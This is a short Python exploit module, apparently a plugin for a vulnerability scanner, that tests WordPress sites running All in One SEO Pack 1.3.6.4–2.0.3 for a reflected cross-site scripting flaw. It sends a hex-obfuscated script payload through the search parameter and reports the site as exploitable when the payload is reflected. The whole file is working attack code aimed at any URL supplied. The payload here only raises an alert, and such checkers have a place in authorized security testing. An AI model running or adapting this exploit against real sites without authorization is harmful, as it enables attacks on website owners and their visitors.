#!/usr/bin/env python
# -*- coding:utf-8 -*-

from lib import logger
from lib import requests

author = "Chu <root@sh3ll.me>"
scope = "All in One SEO Pack 1.3.6.4 - 2.0.3"
description = "WordPress All in One SEO Pack 插件低版本反射型 XSS"
reference = "http://archives.neohapsis.com/archives/bugtraq/2013-10/0006.html"
options = [
    {
        "Name": "URL",
        "Current Setting": "",
        "Required": True,
        "Description": "网站地址"
    }
]


def exploit(URL):
    url = URL + r"/?s=\\x3c\\x2f\\x74\\x69\\x74\\x6c\\x65\\x3e\\x3c\\x73" \
                r"\\x63\\x72\\x69\\x70\\x74\\x3e\\x61\\x6c\\x65\\x72\\x74" \
                r"\\x28\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\\x2e\\x64" \
                r"\\x6f\\x6d\\x61\\x69\\x6e\\x29\\x3c\\x2f\\x73\\x63\\x72" \
                r"\\x69\\x70\\x74\\x3e"
    logger.process("Requesting target site")
    r = requests.get(url, timeout=5)
    r.close()
    if "</title><script>alert(document.domain)</script>" in r.text:
        logger.success("Exploitable!")
        logger.success(url)
        return url